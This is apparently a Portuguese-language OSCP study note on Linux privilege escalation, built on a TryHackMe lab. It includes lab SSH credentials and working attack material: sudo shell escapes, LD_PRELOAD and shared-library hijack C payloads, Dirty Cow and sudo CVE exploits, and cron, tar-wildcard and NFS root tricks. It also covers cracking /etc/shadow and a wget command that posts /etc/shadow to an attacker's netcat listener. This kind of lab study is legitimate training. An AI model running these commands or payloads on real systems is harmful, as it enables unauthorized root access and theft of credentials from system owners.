# Privesc Linux - OSCP

Linux PrivEsc Arena - THM
Connect via ssh
`ssh TCM@10.10.222.207 -oHostKeyAlgorithms=+ssh-dss`
`Hacker123`

- Checklist: [Hacktricks](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)


# Estratégia

- Checar o usuário
	- `id`
	- `whoami`
- Rodar os scripts: Linpeas, Lienum, Les...
- Se os scripts estiverem falhando, rodar comandos manuais das cheatsheets
- Ler os resultados de saída dos scripts com atenção
- Criar um checklist de tudo que deve ser verificado
- Sempre tentar ler o history
- Sempre ir atras das chaves ssh
- Ver diretórios importantes
	- `/var/backup`, `/home/<user>`, `/var/log`
- Testar primeiro métodos que são mais rápidos
- Ver os processos do root, enumerar sua versão para procurar por exploits
- Checar portas, porque pode ser que você encontre alguma que dê pra encaminhar para sua máquina
- Se estiver dando errado, leia os arquivos, processos estranhos e partições
	- O que não for: `ext`, `swap` ou `tmpfs`
- Por ultimo, Kernel


___


# Initial Enumeration

## System Enumeration

- `hostname`
- `uname -a` - Visualizar se é 64bits
- `cat /proc/version` -> `Linux version 2.6.32-5-amd64 (Debian 2.6.32-48squeeze6) (jmm@debian.org) (gcc version 4.3.5 (Debian 4.3.5-4) ) #1 SMP Tue May 13 16:34:35 UTC 2014`
- `cat /etc/issue` -> `Debian GNU/Linux 6.0 \n \l`
- `lscpu` -> Vale a pena olhar, porque alguns xpls só funcionam com um número especifico de threads
- `ps aux` -> Serviços. É importante olhar, pra entender qual usuário está rodando qual serviço.


## User Enumeration

- `id` -> Pra ver os grupos
- `sudo -l`
- `cat /etc/passwd | cut -d : -f 1` -> Da pra ver os usuários. Acima de 1000 são usuários normais
- `cat /etc/shadow` -> Pra quebrar o password
- `cat /etc/group` -> Ver os grupo
- `history` -> É bom sempre dar uma olhada


## Network Enumeration

- `ifconfig` -> Antigo
- `ip a` -> Novo. Ver ip e interfaces de rede
- `route` -> Antigo
- `ip route` -> Novo. Ver as rotas
- `arp -a` -> Antigo
- `ip neigh` -> Novo. Tabela Arp
- `nestat -ano` -> Ver portas e serviços


## Password Hunting

-  `grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null` 
- `locate password (pass, pwd) | more`
- `find / -name autorized_key (id_rsa)`

___

# Automated Tools

### Linpeas

- Primeiro rodar o Linpeas, e depois outras tools
```
# Attacker: python -m http.server

# Victim: wget http://10.6.38.189:8000/linpeas.sh | linpeas.sh
```

- Olhar versão do kernel
- Olhar sempre os red/yellows
- `Modified interesting files in the last 5mins` - > Ajuda a ver cronjobs

### Linenum

```
# Attacker: python -m http.server

# Victim: wget http://10.6.38.189:8000/linenum.sh | linenum.sh
```


### Linux Exploit Suggester

```
# Attacker: python -m http.server

# Victim: wget http://10.6.38.189:8000/les.sh | les.sh
```

### Linux Priv Checker

`sudo python setup.py install`

```
# Attacker: python -m http.server

# Victim: wget http://10.6.38.189:8000/linuxprivchecker.py
python3 -m linuxprivchecker -w -o linuxprivchecker.log
```

___

# Kernel Exploits

[Kernel Exploits](https://github.com/lucyoa/kernel-exploits)

`uname -a`

`Google Linux debian 2.6.32-5-amd64 exploit`

`searchsploit linux kernel 2.6.32 priv esc`

-  É possível rodar o linux-exploit-suggester com o seguinte comando: `./les -k 2.6.32`

### Dirty Cow

[Dirty Cow](https://www.exploit-db.com/exploits/40839)

```
gcc -pthread dirty.c -o dirty -lcrypt

# or gcc -pthread c0w.c -o cow

./dirty" or ./dirty my-new-password 

passwd
# now we are root
```

___

# Services Exploits

- Similares aos exploits de kernel
- O comando `ps aux | grep "^root"` serve para encontrar processos executados como root
- Executando o programa com `<programa> --version` identifica a versão
- Se for debian, da pra rodar também `dpkg -l | grep <program>`. Em rpm, executar `rpm -qa | grep <programa>`
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration) -> Ajuda a verificar esses serviços

___

# Escalation via Stored Passwords

- `history`
- `cat .bash_history | grep pass`
- [Payload All The Things - Looting for Passwords](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#looting-for-passwords)
- `find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;`
- **Sempre olhar nos arquivos de configurações!!**

___

# Week File Permission

- Para confirmar se o root pode logar via SSH na máquina, é só rodar `grep PermitRootLogin /etc/ssh/sshd_config`

## Unshadowing

```
ls -la /etc/passwd
-rw-r--r-- 1 root root 950 Jun 17  2020 /etc/passwd


ls -la /etc/shadow
-rw-rw-r-- 1 root shadow 809 Jun 17  2020 /etc/shadow
```

- Para quebrar a hash do root
```
cat /etc/passwd
# Copiar o passwd


cat /etc/shadow
# Copiar o shadow


unshadow passwd.txt shadow.txt > unshadow.txt
# Pesquisar no hashcat por $6$ (inicio da hash)


hashcat -m 1800 unshadowed.txt rockyou.txt -O

```


- [Hashcat - Exemplos de hash ](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [[Cracking Password#Linux shadow passwd]]


## Shadow Writable

```
cp /etc/shadow /home/usr

mkpasswd -m sha-512 newpassword
# Vai dar uma hash nova

nano /etc/shadow
# Substituir a hash do root com a nova hash

su
# Para entrar como root e depois é só digitar a senha
```

- Se o passwd tiver com `root:x:0:0...`, esse `x` significa que o password está armazenada no shadow
- Antes era possível só deletar o `x`


## Passwd Writable

```
openssl passwd "password"

nano /etc/passwd
# Inserir a hash gerada no lugar do x

su
# Elevar pra root com o password como "passwd"
```

- Também é possível criar um novo root user, copiando a linha de root e colocando como `newroot` em outra linha. Funciona porque o UID ainda é 0


___

# SSH 

```
find / -name authorized_keys 2> /dev/null


find / -name id_rsa 2> /dev/null
```

- Copiar a rsa
- `chmod 600 id_rsa`
- `ssh <user>@<ip> -i id_rsa`

 ____

# Sudo

- `sudo -u <user> <pass>` -> sudo como outro usuário

## Shell Escaping

```
sudo -l

# Output
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```


```
sudo vim -c ':!/bin/bash'
# Escalação com vim

:q!
# Para sair
```


```
sudo awk 'BEGIN {system("/bin/bash")}'
# Escalação com awk
```


```
sudo iftop
# Escalaçao com iftop
# Vai abrir uma tela
# Digitar ! para editar

!/bin/sh

q
# para sair
```


```
find . -exec /bin/bash \; -quit
# Escalação com find
```


```
sudo nano
# Escalação com nano

^R^X
# Digitar com CTRL

reset; sh 1>&0 2>&0

reset
# Precisei usar reset de novo

# ^X para sair e reset para limpar o terminal
```


```
sudo man man
# Escalação com man

!/bin/bash
#Vai abrir a edição do manual

# exit para sair, depois dar enter e usar o q
```


```
sudo less /etc/profile
# Escalação com less

!/bin/bash

# exit para sair, depois dar enter e usar o q
```


```
sudo ftp
# Escalação com ftp

ftp> !/bin/bash

# Dar 2 exit pra sair
```


```
# Escalação com nmap

TF=$(mktemp)
# Cria uma pasta temporária

echo 'os.execute("/bin/sh")' > $TF
# echo para a pasta com o comando de s.o. para invocar uma shell

sudo nmap --script=$TF
# Executa o comando como um script do nmap, que tem a perm de sudo

# Outra escalação
sudo nmap --interactive
!bash

# Outra escalação
echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
```


```
# Escalação com more

TERM= sudo more /etc/profile

!/bin/bash

# exit para sair e depois q
```


- [GTFOBins](https://gtfobins.github.io)

- [[THM Linux Privesc Playground]]


## Intended Funcionality

`apache2 sudo privilege escalation`

```
sudo apache2 -f /etc/shadow
```


```
# Vitima: 
sudo wget --post-file=/etc/shadow <ip>:<porta>

#Atacante:
nc -nlvp <porta>
```


## LD_PRELOAD

- Preload é uma feature do LD, também conhecido como preloading
- LD é um dinamic linker
- O ataque consiste em um preload de uma shared library
- Usar o sudo para executar uma library e usar isso para fazer o preload dela antes de qualquer outra funcionalidade

`nano shell.c`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init(){
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
```

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
- `-fPIC` -> Para executar em 64bits

`sudo LD_PRELOAD=/home/user/shell.so apache2`


## LD_LIBRARY_PATH

- Contém uma série de diretórios onde as shared libraries são procuradas primeiro
- O comando  `ldd /usr/sbin/apache2` serve pra printaras shared libraries usadas por um programa
- Criando uma shared library com o mesmo nome da utilizada pelo programa e mudando o path do LD_LIBRARY_PATH, é possível fazer com que o programa use essa nova lib maliciosa

```
ldd /usr/sbin/apache2
# No output terão vários .so, no curso é utilizado o libcrypt.so

# Criar um arquivo com o código C abaixo, no exemplo foi chamado de library_path.c

gcc -o libcrypt.so.1 -shared -fPIC library_path.c
# Compilando

sudo LD_LIBRARY_PATH=. apache2
# Setar pro diretório onde ta compilado o novo .so
```


```C
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```



## CVE-2019-14287

- [Exploit](https://www.exploit-db.com/exploits/47502)
- Version : Sudo <1.8.28


```
sudo -l 

User hacker may run the following commands on kali:
    (ALL, !root) /bin/bash
# Se aparecer isso, ta vulnerável
# O usuário hacker não poderia usar o /bin/bash como root (!root)

# User privilege specification (Sudoers)
root    ALL=(ALL:ALL) ALL

hacker ALL=(ALL,!root) /bin/bash

sudo -u#-1 /bin/bash
#Exploit
```


## CVE-2019-18634

- [Exploit](https://github.com/saleemrashid/sudo-cve-2019-18634/blob/master/exploit.c)
- Versão vulnerável do sudo: Sudo < 1.8.26
- Precisa aparecer `pwdfeedback` como variável de ambiente quando da um `cat /etc/sudoers` 
- São os asteristicos que aparecem digitando o password com `sudo su root` ou qualquer comando com sudo

```
ggc -o exploit exploit.c

./exploit
```

___

# SUID

- `drwxr-xr-x` -> O primeiro grupo é do file owner, o segundo é do grupo e o terceiro é de todos

- SUID -> Set User ID, é quando um usuário pode executar um arquivo com permissão de um usuário específico (owner do arquivo) 
	- `drwsr-xr-x` -> O S indica que está com o SUID setado
	
- SGID -> Set Group ID, é a mesma coisa, mas para grupos. Se for setado em um diretório, todos os arquivos do diretório herdam essa permissão
	- `drwxr-sr-x` -> O S no grupo indica que está com o SGID setado
	  
- Sticky bit -> É quando setamos a execução para todos
	- `drwxr-xr-t` -> O T simboliza o sticky bit

- Como encontrar:

```
find / -perm -u=s -type f 2>/dev/null
# Arquivos que são owned pelo root, mas com o SUID setado. -u é root

find / -type f -perm -04000 -ls 2>/dev/null
# Comando similar ao de cima

find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null

# No GTFOBins é possível encontrar explorações para SUID específicos
```


## Shared Object Injection


```
find / -type f -perm -04000 -ls 2>/dev/null
# rodando o comando, esse é o output. Da pra ver que tem o suid e o sgid setado

816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
```

- Exploração do suid-so

```
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"

open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)

ls -la /home/user/.config/
ls: cannot access /home/user/.config/: No such file or directory

nano libcalc.c

# copiar o código C para o libcalc

mkdir /home/user/.config

gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/libcalc.c

/usr/local/bin/suid-so

bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```


## Symlinks

- Exploração executada acontece no nginx juntamente com SUID
- Nginx é servidor http e reverse proxy
- Versão nginx < 1.6.2-5+deb8u3
- CVE-2016-1247
- Symlinks são links ou arquivos que fazem referencias a outros arquivos e diretórios na forma de um path relativo ou absoluto

```
find / -type f -perm -04000 -ls 2>/dev/null

812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
# Requisito para rodar

./nginxed-root.sh /var/log/nginx/error.log

# Fazer outro ssh como root e executar o comando:
invoke-rc.d nginx rotate >/dev/null 2>&1

# No outro ssh, teremos shell como root
```



## Environment Variables

- Variáveis disponíveis do sistema e que são herdadas
- `env` -> mostra as variáveis de ambiente

### Exploração 1

```
find / -type f -perm -04000 -ls 2>/dev/null

strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start

# Está executando o apache2 a partir do path
# Podemos mudar o path do service e executar um comando malicioso
# Executar o onliner em c abaixo para gerar um service.c na tmp

gcc /tmp/service.c -o /tmp/service

export PATH=/tmp:$PATH
# Mudando o path para chamar nosso serviço

echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin

/usr/local/bin/suid-env
# Depois é só executar
```

```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
```


### Exploração 2

```
strings /usr/local/bin/suid-env2
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start

# Também da pra rodar com strace: strace -v -f -e execve /usr/local/bin/suid-env2 2>&1 | grep service

function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
# Criando uma função. Versões do bash menores que 4.2-0.48 estão vulneráveis a criação dessas funções para a exploração dos serviços

export -f /usr/sbin/service
# Exportando a função

/usr/local/bin/suid-env2
# Executando o binário

```



### Exploração 3


```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null

strace -v -f -e execve /usr/local/bin/suid-env2 2>&1 | grep apache

/bin/sh --version
# Retornará a versão 4.1.5 -> Que está vulnerável

env -i SHELLOPTS=xtrace PS4='<teste>' /usr/local/bin/suid-env2

env -i SHELLOPTS=xtrace PS4='$(whoami)' /usr/local/bin/suid-env2
# Como está no bash, executará o comando whoami

env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2

/tmp/rootbash -p
```


## Exim exploit

```
exim-4.84.3 --version
# Output retornará a versão

searchsploit exim 4.84-3
# Retornará um exploit de escalação de priv local

#Copiar o xpl e transferir para a máquina local

./xpl.sh
# Retornará um erro com /bin/bash^M o que significa que o xpl foi escrito no windows

sed -i -e "s/^M//" xpl.sh

./xpl.sh
# Virá a shell como root

```

___

# Capabilities

- Capabilities são usabilidades de Super User divididas em funções

```
getcap -r / 2>/dev/null
# Encontrando capabilities

/usr/bin/python2.6 = cap_setuid+ep
# Exemplo de resposta esperada. O ep significa "Permit Everything"

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                
/usr/bin/python2.6 = cap_setuid+ep
# Também tem no linpeas

/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# Escalação de privilégio
```


___

# Cron

- Schedule Tasks

```
cat /etc/crontab

TCM@debian:~/tools/linpeas$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh

```

- Se atentar as tarefas que estão rodando a todo tempo
- No exemplo de cima, são `overwrite.sh` e `compress.sh`, isso da pra ver pelos asteriscos
- Também precisa ver o PATH, porque pode ser explorável
- [Payload All The Things - Schedule Tasks](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#scheduled-tasks)


## Cron Paths

- Olhar nos primeiros caminhos do Path pra ver se existe os arquivos do cron

```
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

- O trecho acima foi coletado do exemplo anterior. É possível ver que o primeiro lugar que vai procurar o overwrite é em /home/user

```
TCM@debian:~/tools/linpeas$ ls -la /home/user/over*
ls: cannot access /home/user/over*: No such file or director

TCM@debian:~/tools/linpeas$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
TCM@debian:~/tools/linpeas$ chmod +x /home/user/overwrite.sh
TCM@debian:~/tools/linpeas$ ls -la /tmp
total 1108
drwxrwxrwt  2 root root   4096 Feb  1 09:21 .
drwxr-xr-x 22 root root   4096 Jun 17  2020 ..
-rw-r--r--  1 root root 181543 Feb  1 09:21 backup.tar.gz
-rwsr-sr-x  1 root root 926536 Feb  1 09:21 bash
-rw-r--r--  1 root root     28 Feb  1 09:20 useless
# O bash ta com o SUID setado e como executável

TCM@debian:~/tools/linpeas$ /tmp/bash -p
bash-4.1# whoami
root
```


## Cron Wildcards


```
TCM@debian:~/tools/linpeas$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
# Esta fazendo um backup com um wildcard

ls -la /usr/local/bin/compress.sh 
-rwxr--r-- 1 root staff 53 May 13  2017 /usr/local/bin/compress.sh
# Somente permissão de leitura
```

- Então a exploração envolve o tar

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
# Copia do bash pra temp modificando o SUID e salvando no arquivo

touch /home/user/--checkpoint=1
# Print o progresso a cada 1 número

touch /home/user/--checkpoint-action=exec=sh\ runme.sh
# Quando bater no checkpoint, vai executar o script sh

/tmp/bash -p
```


- O que aconteceu foi que, como ele executa tudo com wildcard no folder, ele executará como root `tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh\ runme.sh` e chamará o script que modifica o SUID do bash colocado no temp.
- Também é possível criar uma revshell com msfvenom, transferir para a máquina alvo e criar o checkpoint action com `--checkpoint-action=exec=shell.elf`. Na máquina atacante, precisará de um listener para receber a configuração.

## Cron File Overwrite

- Checar se tem permissão de escrita nos arquivos executados no cronjob

```
ls -l /usr/local/bin/overwrite.sh
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh

echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
# Quando o cron rodar, ele vai criar o /tmp/bash como root e com o SUID setado

/tmp/bash -p
```


___

# NFS

- Exploração de no_root_squash
- Para encontrar, precisa dar um `cat /etc/exports`
- Isso significa que é possível montar um folder, no caso: `/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)`

```
# Atacante:
showmount -e $ip
Export list for 10.10.69.114:
/tmp *

mkdir /tmp/mountme

sudo mount -o rw,vers=3 10.10.69.114:/tmp /tmp/mountme

echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/xpl.c

gcc /tmp/mountme/x.c -o /tmp/mountme/x

chmod +s /tmp/mountme/xpl

# Alvo:
cd /tmp
./xpl
```

